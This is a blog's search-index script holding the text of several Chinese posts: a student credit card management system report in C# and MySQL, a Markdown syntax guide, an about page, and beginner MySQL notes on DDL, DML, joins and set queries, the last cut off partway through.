window.__BLOG_SEARCH_DATA__=[{"title":"信用卡管理系统项目文档","path":"/2025/05/06/信用卡管理系统项目文档/","content":"信用卡管理系统项目文档 摘要：本项目是一个基于C#开发的信用卡管理系统，旨在为银行提供一个信息化管理平台，实现用户申请信用卡、激活信用卡、查看交易记录等功能。系统采用Windows Forms构建界面，MySQL作为数据库，采用三层架构设计。项目实现了用户和管理员两种角色的功能分离，具有良好的可扩展性和用户友好的界面。 第1章 项目分析1.1 项目开发的目的1.1.1 研究目的本项目开发目的是为银行提供一个高效的信用卡业务信息化管理平台，简化信用卡申请和审批流程，提高信用卡业务处理效率，同时为用户提供便捷的信用卡申请和管理体验。研究目的在于探索如何通过信息化手段优化传统信用卡业务流程，提高业务处理效率和用户满意度。 1.2 技术选型1.2.1 相关技术介绍开发语言：C# (.NET Framework) 选择理由：强类型语言，面向对象设计，丰富的类库支持 应用方式：实现业务逻辑和界面交互 界面框架：Windows Forms 选择理由：成熟稳定，丰富的控件，易于快速开发桌面应用 应用方式：构建用户界面，实现MDI多文档界面设计 数据库：MySQL 选择理由：开源免费，性能稳定，易于部署和维护 应用方式：存储用户、卡片、交易和消息等核心数据 数据访问技术：ADO.NET与MySQL ConnectorNET 选择理由：与.NET框架无缝集成，提供高效的数据访问能力 应用方式：实现数据的增删改查操作 开发工具：Visual Studio 选择理由：集成开发环境，提供丰富的调试和设计工具 应用方式：代码编写、界面设计和项目管理 1.3 数据库分析1.3.1 数据库概念模型分析(E-R模型)核心实体： User(用户) 属性：u_id, u_name, u_tel, u_pass, u_type 描述：存储系统用户信息，包括用户ID、姓名、电话、密码和用户类型 Admin(管理员) 属性：a_id, a_pass 描述：存储系统管理员信息，包括管理员ID和密码 Card(信用卡) 属性：c_id, b_id, u_id, c_pass, c_state, c_time 描述：存储信用卡信息，包括卡号、卡类型ID、持卡人ID、密码、状态和开卡时间 BaseCard(信用卡类型) 属性：b_id, b_type, b_term, b_limit 描述：存储信用卡基础类型信息，包括类型ID、类型名称、有效期和额度 Transfer(交易记录) 属性：t_id, c_id, t_amount, t_time 描述：存储交易记录，包括交易ID、卡号、交易金额和交易时间 Message(系统消息) 属性：m_id, u_id, m_msg, m_time, m_state 描述：存储系统消息，包括消息ID、用户ID、消息内容、发送时间和消息状态 实体关系： User与Card: 一对多关系，一个用户可拥有多张信用卡 BaseCard与Card: 一对多关系，一种卡类型可对应多张实际信用卡 Card与Transfer: 一对多关系，一张信用卡可有多条交易记录 User与Message: 一对多关系，一个用户可收到多条系统消息 Admin与Card: 管理员负责审核卡片申请和激活请求 第2章 项目设计2.1 总体介绍2.1.1 项目的设计思路本项目采用三层架构进行设计，将系统划分为表示层、业务逻辑层和数据访问层： **表示层(UI层)**：基于Windows Forms实现用户界面，负责与用户交互，展示数据和接收用户输入。 **业务逻辑层(BLL)**：封装核心业务规则和数据处理逻辑，处理表示层传递的请求，调用数据访问层完成数据操作。 **数据访问层(DAL)**：通过MySqlDao类实现对MySQL数据库的访问操作，封装SQL语句和数据库连接管理。 设计思路主要遵循以下原则： 模块化设计：将系统划分为多个功能模块，便于开发和维护 权限分离：实现用户和管理员两种角色，权限严格区分 数据一致性：保证数据的完整性和一致性 用户友好：提供直观、易用的操作界面 2.2 结构设计2.2.1 结构设计的目的以及功能结构图结构设计目的： 实现系统功能的模块化和组件化 降低系统各部分之间的耦合度 提高系统的可维护性和可扩展性 便于多人协作开发和系统维护 功能结构图： 信用卡管理系统├── 用户子系统│ ├── 用户注册/登录│ ├── 信用卡申请│ ├── 信用卡激活│ ├── 交易记录查询│ ├── 个人信息管理│ └── 系统消息查看└── 管理员子系统 ├── 管理员登录 ├── 信用卡申请审核 ├── 信用卡激活审核 ├── 用户信息管理 ├── 交易记录管理 └── 系统消息发送 2.3 功能模块设计系统主要包含以下核心功能模块： 用户管理模块 功能：用户注册、登录、个人信息管理 核心类：User类 主要方法：registerUser()、userLogin()、updateUser() 管理员管理模块 功能：管理员登录、权限管理 核心类：Admin类 主要方法：adminLogin()、verifyAdmin() 信用卡管理模块 功能：信用卡申请、激活、状态查询 核心类：Card类、BaseCard类 主要方法：applyCard()、activateCard()、updateCardState() 交易管理模块 功能：交易记录创建、查询 核心类：Transfer类 主要方法：createTransfer()、queryTransfer() 消息管理模块 功能：系统消息发送、接收、查看 核心类：Msg类 主要方法：sendMsg()、readMsg()、updateMsgState() 2.4 数据库表设计系统数据库由以下表组成： users表 CREATE TABLE users ( u_id VARCHAR(20) PRIMARY KEY, u_name VARCHAR(50) NOT NULL, u_tel VARCHAR(20) NOT NULL, u_pass VARCHAR(50) NOT NULL, u_type INT DEFAULT 0); admin表 CREATE TABLE admin ( a_id VARCHAR(20) PRIMARY KEY, a_pass VARCHAR(50) NOT NULL); base_card表 CREATE TABLE base_card ( b_id VARCHAR(20) PRIMARY KEY, b_type VARCHAR(50) NOT NULL, b_term INT NOT NULL, b_limit DECIMAL(10,2) NOT NULL); card表 CREATE TABLE card ( c_id VARCHAR(20) PRIMARY KEY, b_id VARCHAR(20) NOT NULL, u_id VARCHAR(20) NOT NULL, c_pass VARCHAR(50) NOT NULL, c_state INT DEFAULT 0, c_time VARCHAR(20), FOREIGN KEY (b_id) REFERENCES base_card(b_id), FOREIGN KEY (u_id) REFERENCES users(u_id)); transfer表 CREATE TABLE transfer ( t_id VARCHAR(20) PRIMARY KEY, c_id VARCHAR(20) NOT NULL, t_amount DECIMAL(10,2) NOT NULL, t_time VARCHAR(20) NOT NULL, FOREIGN KEY (c_id) REFERENCES card(c_id)); message表 CREATE TABLE message ( m_id VARCHAR(20) PRIMARY KEY, u_id VARCHAR(20) NOT NULL, m_msg TEXT NOT NULL, m_time VARCHAR(20) NOT NULL, m_state INT DEFAULT 0, FOREIGN KEY (u_id) REFERENCES users(u_id)); 第3章 项目实现3.1 项目资源结构3.1.1 项目的开发资源项目资源结构如下： UI层文件 Home.cs.resx - 主登录界面 UserHome.cs.resx - 用户主界面 AdminHome.cs.resx - 管理员主界面 Register.cs.resx - 用户注册界面 业务实体类文件 Admin.cs - 管理员实体类 User.cs - 用户实体类 Card.cs - 信用卡实体类 BaseCard.cs - 基础卡类型实体类 Transfer.cs - 交易记录实体类 Msg.cs - 消息实体类 数据访问层文件 MySqlDao.cs - MySQL数据库访问类 工具类文件 Utils.cs - 工具方法类 程序入口 Program.cs - 程序入口类 3.2 整体界面实现3.2.1 MDI主窗体文档介绍系统采用MDI(多文档界面)设计模式，主要界面包括： 登录界面(Home.cs) 功能：提供用户和管理员登录入口 主要控件： RadioButton：选择用户类型（普通用户管理员） TextBox：输入用户名和密码 Button：登录和注册按钮 实现逻辑：根据选择的用户类型调用不同的登录方法，验证成功后打开相应的主界面 用户主界面(UserHome.cs) 采用TabControl控件实现多功能页面管理 主要Tab页面： 个人信息页：显示和更新用户信息 信用卡申请页：提供信用卡申请功能 信用卡激活页：提供信用卡激活功能 交易记录页：显示交易历史记录 系统消息页：显示系统通知消息 使用DataGridView控件展示列表数据 实现自适应布局，提高用户体验 管理员主界面(AdminHome.cs) 同样采用TabControl实现功能分区 主要Tab页面： 信用卡申请管理页：处理用户的卡片申请 信用卡激活管理页：处理用户的卡片激活请求 用户管理页：管理系统用户 消息管理页：发送系统消息 3.3 关键模块的实现3.3.1 用户登录模块的界面以及实现代码登录界面设计： 界面包含用户名输入框、密码输入框 用户类型选择（单选按钮） 登录和注册按钮 关键代码实现： private void loginButton_Click(object sender, EventArgs e) // 获取用户输入 string userId = idTextBox.Text.Trim(); string password = passwordTextBox.Text.Trim(); // 输入验证 if (string.IsNullOrEmpty(userId) || string.IsNullOrEmpty(password)) MessageBox.Show(用户名和密码不能为空！, 提示, MessageBoxButtons.OK, MessageBoxIcon.Warning); return; // 根据选择的用户类型调用不同的登录方法 if (userRadioButton.Checked) // 用户登录 User user = MySqlDao.userLogin(userId, password); if (user != null) // 登录成功，打开用户主界面 UserHome userHome = new UserHome(user); this.Hide(); userHome.ShowDialog(); this.Show(); else MessageBox.Show(用户名或密码错误！, 登录失败, MessageBoxButtons.OK, MessageBoxIcon.Error); else if (adminRadioButton.Checked) // 管理员登录 Admin admin = MySqlDao.adminLogin(userId, password); if (admin != null) // 登录成功，打开管理员主界面 AdminHome adminHome = new AdminHome(admin); this.Hide(); adminHome.ShowDialog(); this.Show(); else MessageBox.Show(管理员ID或密码错误！, 登录失败, MessageBoxButtons.OK, MessageBoxIcon.Error); 3.3.2 信用卡申请模块的界面以及实现代码信用卡申请界面设计： 下拉列表选择卡片类型 显示卡片类型详情（额度、有效期） 密码输入框及确认密码输入框 申请提交按钮 关键代码实现： private void submit_Click(object sender, EventArgs e) // 获取用户选择的卡片类型 string selectedCardTypeId = ((BaseCard)type.SelectedItem).b_id; // 获取密码输入 string cardPassword = pass.Text.Trim(); string confirmPassword = c_pass.Text.Trim(); // 输入验证 if (string.IsNullOrEmpty(cardPassword)) MessageBox.Show(密码不能为空！, 提示, MessageBoxButtons.OK, MessageBoxIcon.Warning); return; if (!cardPassword.Equals(confirmPassword)) MessageBox.Show(两次密码输入不一致！, 提示, MessageBoxButtons.OK, MessageBoxIcon.Warning); return; // 生成卡号 string cardId = GenerateCardId(); // 创建卡片对象 Card card = new Card(); card.c_id = cardId; card.b_id = selectedCardTypeId; card.u_id = currentUser.u_id; card.c_pass = cardPassword; card.c_state = 0; // 初始状态为申请中 // 提交申请 bool success = MySqlDao.insertCard(card); if (success) MessageBox.Show(信用卡申请已提交，请等待审核！, 申请成功, MessageBoxButtons.OK, MessageBoxIcon.Information); // 刷新卡片列表 RefreshCardList(); else MessageBox.Show(申请提交失败，请稍后重试！, 申请失败, MessageBoxButtons.OK, MessageBoxIcon.Error); 3.3.3 交易记录查询模块的界面以及实现代码交易记录查询界面设计： 卡片选择下拉列表 交易记录数据网格视图 查询按钮 关键代码实现： private void queryTransfer_Click(object sender, EventArgs e) // 获取选中的卡片 if (cardComboBox.SelectedItem == null) MessageBox.Show(请选择要查询的卡片！, 提示, MessageBoxButtons.OK, MessageBoxIcon.Warning); return; string selectedCardId = ((Card)cardComboBox.SelectedItem).c_id; // 查询交易记录 ListTransfer transfers = MySqlDao.selectTransfer(selectedCardId); // 显示查询结果 transferDataGridView.DataSource = null; if (transfers != null transfers.Count 0) transferDataGridView.DataSource = transfers; // 格式化显示 transferDataGridView.Columns[t_id].HeaderText = 交易ID; transferDataGridView.Columns[c_id].HeaderText = 卡号; transferDataGridView.Columns[t_amount].HeaderText = 交易金额; transferDataGridView.Columns[t_time].HeaderText = 交易时间; else MessageBox.Show(未查询到交易记录！, 提示, MessageBoxButtons.OK, MessageBoxIcon.Information); 第4章 项目测试4.1 系统测试4.1.1 测试目的系统测试的目的是验证信用卡管理系统的功能完整性、可靠性和易用性，确保系统能够满足预期的业务需求，发现并修复潜在的问题，提高系统的整体质量。 4.1.2 测试原则及方法测试原则： 全面性：测试应覆盖所有功能模块和业务流程 系统性：按照系统架构层次和模块关系进行系统化测试 重点性：重点测试核心功能和高风险区域 可重复性：测试过程可重复执行，结果可验证 测试方法： 单元测试：验证各个功能模块的正确性 集成测试：验证模块间接口和交互 功能测试：验证系统功能是否符合需求规格 性能测试：测试系统在不同负载下的响应性能 用户界面测试：测试界面的可用性和友好性 4.1.3 测试内容 用户登录测试 测试内容：验证用户名和密码的验证逻辑 测试用例： 正确的用户名和密码 - 预期结果：登录成功 错误的用户名或密码 - 预期结果：显示错误提示 空白用户名或密码 - 预期结果：显示输入提示 信用卡申请测试 测试内容：验证信用卡申请流程 测试用例： 正常申请信用卡 - 预期结果：申请成功，状态为待审核 密码不一致 - 预期结果：显示错误提示 不选择卡类型 - 预期结果：显示选择提示 信用卡激活测试 测试内容：验证信用卡激活流程 测试用例： 正常激活已审批的信用卡 - 预期结果：提交激活申请成功 卡密码错误 - 预期结果：显示密码错误提示 已激活的卡再次激活 - 预期结果：显示已激活提示 交易记录查询测试 测试内容：验证交易记录查询功能 测试用例： 查询有交易记录的卡 - 预期结果：显示交易记录列表 查询无交易记录的卡 - 预期结果：显示无记录提示 不选择卡片直接查询 - 预期结果：显示选择提示 管理员审核测试 测试内容：验证管理员审核功能 测试用例： 审批通过信用卡申请 - 预期结果：申请状态更新为已通过 审批拒绝信用卡申请 - 预期结果：申请状态更新为已拒绝 审批通过激活请求 - 预期结果：卡状态更新为已激活 消息系统测试 测试内容：验证系统消息功能 测试用例： 管理员发送消息 - 预期结果：消息成功保存并对目标用户可见 用户查看消息 - 预期结果：消息状态更新为已读 用户删除消息 - 预期结果：消息从列表中移除 4.2 系统调试系统调试主要包括以下内容： 界面功能调试 调试目标：确保所有界面控件功能正常，包括按钮点击、列表选择、数据展示等 调试方法：手动操作各界面控件，验证响应是否符合预期 发现的问题：部分界面响应迟缓，优化了数据加载方式 数据库连接测试 调试目标：验证系统与MySQL数据库的连接稳定性 调试方法：模拟高频率数据库操作，监控连接状态 解决措施：实现数据库连接池，优化连接管理 异常处理测试 调试目标：确保系统对各种异常情况有适当处理 调试方法：模拟各种异常场景，如数据库连接中断、非法输入等 改进措施：完善异常捕获机制，增加用户友好的错误提示 并发操作测试 调试目标：验证系统在多用户同时操作下的稳定性 调试方法：模拟多用户同时登录和操作 优化措施：增加数据库锁机制，避免并发冲突 性能优化 调试目标：提高系统响应速度和资源利用效率 调试方法：使用性能分析工具监测系统性能瓶颈 优化措施：优化SQL查询语句，实现数据缓存机制 结论本项目成功开发了一个功能完整的信用卡管理系统，实现了用户申请信用卡、激活信用卡、查看交易记录等核心功能，以及管理员审核信用卡申请、激活请求等管理功能。系统采用C#语言和Windows Forms开发，使用MySQL作为数据库，遵循三层架构设计原则。 系统具有以下特点： 功能完整：覆盖信用卡业务的主要流程，包括申请、审核、激活和使用管理 架构清晰：采用三层架构，模块划分合理，耦合度低 界面友好：提供直观易用的用户界面，操作简单明确 安全可靠：实现用户身份验证，数据访问控制等安全机制 可扩展性：良好的架构设计为未来功能扩展提供了基础 在项目开发过程中，团队积累了Windows Forms应用程序开发、数据库设计与优化、多角色权限管理等方面的经验。系统测试结果表明，开发的信用卡管理系统能够稳定运行，满足预期的业务需求。 未来可考虑的改进方向包括： 增加更多类型的信用卡产品支持 实现更复杂的交易分析和统计功能 增强系统安全性，如增加双因素认证 提供移动端应用，实现跨平台访问 参考文献 李刚. C#高级编程. 北京: 电子工业出版社, 2020. 杨中科. Windows程序设计. 北京: 清华大学出版社, 2019. 马丁·福勒(Martin Fowler). 企业应用架构模式. 北京: 机械工业出版社, 2018. MySQL 8.0 参考手册. MySQL AB公司, 2021. Microsoft. .NET Framework 4.8 开发指南. Microsoft Developer Network, 2020. 郑阿奇. 软件工程方法与实践. 北京: 人民邮电出版社, 2021. 张海藩. 软件测试方法. 北京: 机械工业出版社, 2019. Guy Hart-Davis. Windows Forms编程. 北京: 人民邮电出版社, 2018.","tags":["项目实践"]},{"title":"Markdown语法综述","path":"/2024/01/24/Markdown语法综述/","content":"什么是Markdown? Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档。 Markdown 语言在 2004 由约翰·格鲁伯（英语：John Gruber）创建。 Markdown 编写的文档可以导出 HTML 、Word、图像、PDF、Epub 等多种格式的文档。 Markdown 编写的文档后缀为 .md, .markdown。 为什么要使用Markdown Markdown 可以用于一切。包括可以使用它来创建网站、文档、笔记、书籍、演示文稿、电子邮件和技术文档。 Markdown 具有可移植性。包含 Markdown 格式文本的文件几乎可以使用任何应用程序打开。如果不喜欢当前使用的 Markdown 应用程序，则可以将 Markdown 文件导入另一个 Markdown 应用程序。 Markdown 独立于平台。可以在任何运行任何操作系统的设备上创建 Markdown 格式的文本。 Markdown 是面向未来的。即使使用的应用程序在未来某个时候停止工作，仍然可以使用文本编辑应用程序阅读 Markdown 格式的文本。 Markdown 无处不在。Reddit 和 GitHub 等网站都支持Markdown，许多桌面和基于 Web 的应用程序也支持它。 Markdown基本语法1. 标题使用 # 加空格来添加标题，其数量即为标题等级，一般只能做到1-6级。 [!标题演示] 一级标题二级标题三级标题四级标题五级标题六级标题 3. 段落格式(1)段落段落的换行有两种方式： 第一种是直接在段落末尾加两个空格 第二种是在段落下一行使用空格两种方式都可，区别在之间的间距。转换成 md-html 时，可以看到第一种：p这是第一段的第一行。br这是第一段的第二行。/p 第二种：p这是第二段的第一行。/pp这是第二段的第二行。/p 这就是两者之间的差别。 (2)字体markdown有很多修饰字体的方法，如斜体、粗体、粗斜体、添加删除线等 我是斜体 斜体 在文字左右用*或_修饰我是粗体 粗体 同斜体符号，使用两个一样的我是粗斜体 粗斜体 同上，使用三个一样的我是删除线 删除线 使用两个~我是下划线 下划线 使用u标签我是高亮 高亮 使用两个= 为保护兼容性，推荐使用* 而不是_，此外，下划线在如果支持html的md编辑器里可以用u标签，有些没有兼容的编辑器可能有其他方法，在此不赘述。 (3)脚注对文本补充说明创建脚注引用，可以在[]内添加插入符号和标识符。标识符可以是数字或单词，但不能包含空格或制表符。标识符仅将脚注引用与脚注本身相关联 — 在输出中，脚注是按顺序编号的。[^1] [要注明的文本 ] : 脚注允许您添加注释和引用，创建脚注时，添加脚注引用的位置会显示一个带有链接的上标编号。读者可以点击链接跳转到页面底部的脚注内容。(若没有则是编辑器不支持) 4.列表(1)有序列表有序列表使用数字并加上 . 号再加上空格来表示 第一项 第二项 第三项 (2)无序列表无序列表使用星号(*)、加号(+)或是减号(-)作为列表标记，注意这些标记后面要添加一个空格 第一项 第一项 第一项 (3)任务列表任务列表（也称为清单和待办事项列表）允许创建带有复选框的项目列表。使-和[] 加空格来创建，要选中复选框，在之间添加一个x. - [x] a- [ ] b a b (4)列表嵌套只需在子列表中的选项前面添加两个或四个空格即可 1. 第一项： - 第一项嵌套的第一个元素 - 第一项嵌套的第二个元素2. 第二项： - 第二项嵌套的第一个元素 - 第二项嵌套的第二个元素 显示结果： 第一项： 第一项嵌套的第一个元素 第一项嵌套的第二个元素 第二项： 第二项嵌套的第一个元素 第二项嵌套的第二个元素 5. 区块 区块引用是在段落开头使用 符号 ，然后后面紧跟一个空格符号 另外区块是可以嵌套的，一个 符号是最外层，两个 符号是第一层嵌套，以此类推： 最外层 第一层嵌套 第二层嵌套 显示结果： 最外层 第一层嵌套 第二层嵌套 此外，区块和列表在使用时有很多嵌套方式 区块中使用列表 区块中使用列表 1. 第一项 * 第一项 + 第二项 - 第三项 显示： 区块中使用列表 第一项 第一项 第二项 第三项 列表中使用区块需要在前添加四个空格的缩进。* 第一项 first second* 第二项 显示： 第一项 firstsecond 第二项 6. 代码单个函数或代码片段使用 来包括使用；代码区块 使用 4 个空格或者一个制表符（Tab 键) 使用tab 使用空格 三个点号 7. 链接链接使用方法如下： `[链接名称](链接地址)``或者``链接地址` 可以跟脚注连用 [!连接展示]这个链接用 1 作为网址变量 [Google][1]然后在文档的结尾为变量赋值（网址） [1]: http://www.google.com/ 8. 图片图片语法格式如下： ![alt 属性文本](图片地址)![alt 属性文本](图片地址 可选标题) 方括号，里面放图片的替代文字，普通括号，里面放上图片的网址，最后还可以用引号包住并加上选择性的 ‘title’ 属性的文字。与链接一样可以与脚注连用，不在演示。 9. 表格 制作表格使用 |来分隔不同的单元格，使用 - 来分隔表头和其他行。 | 表头 | 表头 || ---- | ---- || 单元格 | 单元格 || 单元格 | 单元格 | 展示： 表头 表头 单元格 单元格 单元格 单元格 可以设置表格的对齐方式： -: 设置内容和标题栏居右对齐。 :- 设置内容和标题栏居左对齐。 :-: 设置内容和标题栏居中对齐。 | 左对齐 | 右对齐 | 居中对齐 || :-----| ----: | :----: || 单元格 | 单元格 | 单元格 || 单元格 | 单元格 | 单元格 | 展示： 左对齐 右对齐 居中对齐 单元格 单元格 单元格 单元格 单元格 单元格 注：表格的上下两行不宜有字。 参考资料：Markdown Guide_https://www.markdownguide.org/菜鸟教程Markdown 教程 | 菜鸟教程 (runoob.com)维基百科_ https://zh.wikipedia.org/wiki/Markdown","tags":["基础语法","开发工具"]},{"title":"关于我","path":"/about/index.html","content":"你好 这里是 Wxi 的个人博客。这座站点主要记录 Java / Spring / MySQL 学习笔记、Networking / 基础安全 / 工具 探索、项目实践，以及阅读和随笔。 我想把这里做成什么 一个按发布时间持续更新的个人博客主页 一个按主题模块整理内容的探索入口 一个方便自己复盘，也方便以后快速回查的知识仓库 你可以从这里开始 近期发布 探索 归档 标签 关于内容 技术类文章会持续修订，但首页和列表统一按发布日期组织 阅读与随笔更偏个人记录，保留当下阶段的真实想法 页面日期统一按北京时间展示，不显示具体时分 在线足迹 GitHub: wxi7641 进入探索 solar:archive-bold-duotone查看归档"},{"title":"MySQL笔记01","path":"/wiki/database/mysql-note-01.html","content":"MySQL 使用“数据库、表、记录、字段”四层结构组织数据。增删改查、条件查询和多表连接都建立在这些对象及其关系之上。 数据库负责组织数据，表负责承载结构，记录负责保存一行数据，SQL 负责和这些对象打交道。 一、先看清 SQL 的四类常见操作结合这一组练习 SQL，看 MySQL 最合适的切入方式仍然是分类。 分类 全称 常见命令 主要作用 DDL Data Definition Language CREATE、ALTER、DROP 定义数据库对象 DML Data Manipulation Language INSERT、UPDATE、DELETE 操作表中的数据 DQL Data Query Language SELECT 查询数据 DCL Data Control Language GRANT、REVOKE 权限控制 教学时最先接触到的往往是 DDL + DML + DQL，因为它们直接对应“建东西、放数据、查数据”。 二、数据库级操作真正解决的是“数据放在哪里”这一组 SQL 里最先出现的是数据库层面的操作： SHOW DATABASES;CREATE DATABASE javaclass;CREATE DATABASE IF NOT EXISTS javaclass;DROP DATABASE javaclass;DROP DATABASE IF EXISTS javaclass;ALTER DATABASE test_dbDEFAULT CHARACTER SET utf8mb4DEFAULT COLLATE utf8mb4_general_ci;USE db_test01; 这几条语句看起来基础，但覆盖了数据库对象最常见的生命周期。 SHOW DATABASES 不只是“看看有什么库”它很适合放在进入 MySQL 环境后的第一步，因为能帮助确认当前连接是正常的、数据库服务是可用的、库列表也确实存在。 配合模糊匹配后，教学意义会更明显： SHOW DATABASES LIKE test%;SHOW DATABASES LIKE %test;SHOW DATABASES LIKE d%;SHOW DATABASES LIKE _e%; 这里也带出了 MySQL 模式匹配的两种通配思维： 通配符 含义 % 任意长度字符 _ 单个字符 这套规则不只在 SHOW DATABASES LIKE 里能用，后面的 WHERE ... LIKE 查询里也会反复出现。 CREATE DATABASE 真正定义的是“库”的边界CREATE DATABASE javaclass;CREATE DATABASE IF NOT EXISTS javaclass; 这里最值得记住的是 IF NOT EXISTS。它不是语法细节，而是一种很实用的防御式写法。因为在反复练习、反复执行脚本的过程中，最常见的问题就是“对象已经存在”。 ALTER DATABASE 经常被低估ALTER DATABASE test_dbDEFAULT CHARACTER SET utf8mb4DEFAULT COLLATE utf8mb4_general_ci; 这一条语句的重点不只是“改配置”，而是要知道字符集和排序规则会直接影响后续： 中文是否正常存储 表情和扩展字符是否可写入 文本比较和排序行为 在新建数据库时，utf8mb4 往往是更稳妥的默认选择。 USE 的含义是切换当前工作上下文USE db_test01; 执行这条语句之后，后续针对表的操作默认都发生在当前库中。它很像开发环境里的“当前工作目录”，不切换上下文，很多表操作就会落不到正确位置。 三、表级 DDL 是真正开始“设计结构”数据库准备好之后，下一步就会进入表结构定义。 CREATE TABLE cat( id INT, name VARCHAR(10), color VARCHAR(5), birthday DATE); 这一条语句非常适合拿来讲表结构的基本组成： 字段 类型 说明 id INT 整数编号 name VARCHAR(10) 可变长度字符串 color VARCHAR(5) 颜色文本 birthday DATE 日期 DESC 是观察表结构最直接的方式DESC cat; 很多教学练习里都先写表，再立刻 DESC 一次。这个习惯很好，因为它能让“写下去的结构”和“数据库实际生成的结构”形成闭环。 四、ALTER TABLE 是表结构演进的核心命令这一组 SQL 把表结构修改的常见动作几乎都演示了一遍。 1. 重命名表ALTER TABLE cat RENAME TO dog; 表名的变化，本质上是在变更数据库对象的标识。 2. 新增列ALTER TABLE dog ADD address VARCHAR(50); 这一步体现的是“结构追加”。真实开发里字段通常不会一次性设计完，后续加列非常常见。 3. 修改字段类型ALTER TABLE dog MODIFY color CHAR(5); MODIFY 更适合做字段类型、长度、约束层面的调整。 4. 修改字段名ALTER TABLE dog CHANGE color colorname CHAR(5); CHANGE 和 MODIFY 很容易混。最直接的记忆方式可以是： 命令 更适合做什么 MODIFY 改字段定义 CHANGE 改字段名，同时也可以重写字段定义 5. 删除列ALTER TABLE dog DROP address; 结构删除一定要谨慎，因为删掉的是列本身，不只是列里的值。 五、DML 开始处理“表里到底放什么数据”表结构建立之后，下一步自然就是插入、修改、删除数据。 INSERT 最常见的三种写法单列插入： INSERT INTO dog(id, name) VALUES(1, 小黑); 完整列插入： INSERT INTO dog(id, name, colorname, birthday)VALUES(2, 小红, 红色, 2025-06-23); 批量插入： INSERT INTO dog(id, name, colorname, birthday) VALUES(3, 小黄, 黄色, 2025-06-22),(4, 小绿, 绿色, 2025-06-21),(5, 小紫, 紫色, 2025-06-20); 这里最值得形成的习惯是：尽量显式写字段名。这样可读性更高，也不容易因为列顺序变化导致数据错位。 UPDATE 的重点不是“会改”，而是“知道改谁”UPDATE dog SET colorname = 红色 WHERE id = 2;UPDATE dog SET colorname = 亮红色 WHERE name = 小红; UPDATE 最关键的部分不是 SET，而是 WHERE。没有 WHERE，就意味着整张表都会被更新。 初学阶段最该建立的安全意识之一，就是更新和删除前先确认条件。 DELETE 也一样，重点在范围控制DELETE FROM dog WHERE id = 6; 这条语句的核心不是删除动作本身，而是通过条件把影响范围限制住。 六、基础 SELECT 是所有查询的起点这一组 SQL 里已经开始进入最常见的查询场景： SELECT * FROM stu;SELECT name, age FROM stu;SELECT name AS 姓名, age AS 年龄 FROM stu;SELECT DISTINCT address FROM stu; 这里适合先建立四个概念： 写法 作用 SELECT * 查询所有列 SELECT col1, col2 查询指定列 AS 给列起别名 DISTINCT 去重 别名的意义不只是“好看”SELECT name AS 姓名, age AS 年龄 FROM stu; 别名一方面能提升结果可读性，另一方面也常用于聚合查询、临时结果、报表输出。 DISTINCT 最适合处理“重复值很多，但只关心有哪些”SELECT DISTINCT address FROM stu; 如果表里很多学生都来自同一个地区，直接查地址会重复；而 DISTINCT 关注的是不同取值的集合。 七、这一组基础语句真正建立的是“结构感”从 6 月 23 日这组 SQL 往后看，会很明显地发现它不是简单地把命令堆在一起，而是在建立一条最基础的数据库操作主线： 先看数据库- 创建数据库- 进入数据库- 建表- 调整表结构- 插入数据- 修改和删除数据- 开始查询 这条主线一旦形成，后面继续学习条件查询、排序、分组、连接查询时，就不会只是在背新语法，而是在不断扩展同一个数据库世界观。","tags":[null,null,null,null]},{"title":"数据库","path":"/wiki/database/index.html","content":"SQL、JDBC、持久层、事务与数据库实践记录。"},{"title":"MySQL笔记03","path":"/wiki/database/mysql-note-03.html","content":"单表查询解决的是“在一张表里找数据”，而真正接近业务场景的数据库操作，通常都会进入多表、关系和结果集组合的阶段。集合查询、多表连接、主外键建模，正是从“会查表”走向“会设计数据关系”的关键一步。 一、集合查询解决的是“把多段结果拼在一起”这组 SQL 的开头先展示了三种很有代表性的集合操作： SELECT id, name, math, english FROM stu WHERE math 90UNIONSELECT id, name, math, english FROM stu WHERE english 90; SELECT id, name, math, english FROM stu WHERE math 90INTERSECTSELECT id, name, math, english FROM stu WHERE english 90; SELECT id, name, math FROM stuEXCEPTSELECT id, name, math FROM stu WHERE math 90; 最容易理解的方式是直接按集合意义去记： 操作 含义 UNION 并集，合并结果并去重 INTERSECT 交集，同时满足两边条件 EXCEPT 差集，保留左边减去右边后的结果 UNION 和 UNION ALL 不是一回事虽然这组 SQL 里写的是 UNION，但继续扩展时一定会遇到 UNION ALL。 写法 特点 UNION 自动去重 UNION ALL 不去重，性能通常更直接 如果业务上允许重复记录保留，UNION ALL 会是更常见的选择。 集合查询也要注意环境兼容性在一些 MySQL 环境中，INTERSECT 或 EXCEPT 可能无法直接使用。遇到这种情况，可以考虑改写成： INNER JOIN IN / NOT IN EXISTS / NOT EXISTS 也就是说，集合查询是一种表达思路，不一定只能用单一写法实现。 二、复合主键适合拿来理解“唯一性不是只有一个字段”这一组 SQL 里创建了一个很有代表性的成绩表： CREATE TABLE score( sid INT, subject VARCHAR(20), score DOUBLE(5,2), PRIMARY KEY(sid, subject)); 这里最值得注意的是： PRIMARY KEY(sid, subject) 这说明主键不一定只能是单字段。对于成绩表这种结构来说，“某个学生的某门课程”组合在一起，才真正唯一。 三、笛卡尔积是多表查询里最应该先避开的情况SELECT s.id AS stu_id, s.name AS stu_name, sc.sid AS score_sid, sc.subject, sc.scoreFROM stu s, score sc; 这段 SQL 的教学价值非常高，因为它会直接带出笛卡尔积问题。 如果两张表之间没有写连接条件，那么结果会是两张表记录的全排列。初学者一旦发现查询结果“突然爆炸变多”，十有八九就是这里出了问题。 多表查询一旦缺少连接条件，先怀疑是不是跑出了笛卡尔积。 四、内连接真正表示的是“两边都匹配上”SELECT s.id AS stu_id, s.name AS stu_name, sc.sid AS score_sid, sc.subject, sc.scoreFROM stu sINNER JOIN score sc ON s.id = sc.sid; INNER JOIN 的核心语义很适合直接记成一句话：只保留两边能匹配上的记录。 在这个例子里，学生表和成绩表通过 id = sid 建立了关联，所以结果里看到的是“有成绩记录的学生”。 五、左连接和右连接的重点不是语法，而是谁保底左连接： SELECT s.id, s.name, sc.subject, sc.scoreFROM stu sLEFT JOIN score sc ON s.id = sc.sid; 右连接： SELECT s.id, s.name, sc.subject, sc.scoreFROM stu sRIGHT JOIN score sc ON s.id = sc.sid; 理解这两种连接时，最好的问题不是“左和右怎么背”，而是“哪张表的数据一定要保留”。 连接方式 谁一定保留 INNER JOIN 只保留匹配成功的部分 LEFT JOIN 左表全部保留 RIGHT JOIN 右表全部保留 这张表一旦记住，多表连接就会清楚很多。 六、主键和外键开始让表之间真正形成关系后半段 SQL 